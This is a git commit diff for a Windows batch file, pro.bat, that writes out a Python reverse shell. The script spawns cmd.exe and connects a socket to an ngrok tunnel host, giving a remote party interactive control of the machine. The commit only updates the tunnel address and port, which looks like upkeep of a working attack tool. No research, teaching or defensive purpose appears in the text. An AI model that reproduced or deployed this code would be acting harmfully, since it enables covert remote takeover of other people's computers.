0118b8f303ebe5d4f706a41826358ae6216e8f89
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 05:59:13 +0300

    Update pro.bat

--- pro.bat
+++ pro.bat
@@ -12,7 +12,7 @@ if not exist %FILE% (
         echo def rev^(^)^:
         echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)
         echo    s = socket.socket^(^)
-        echo    s.connect^(('0.tcp.eu.ngrok.io', 14276^)^)
+        echo    s.connect^(('4.tcp.eu.ngrok.io', 17031^)^)
         echo.
         echo    def s_o^(^)^:
         echo        while True^:
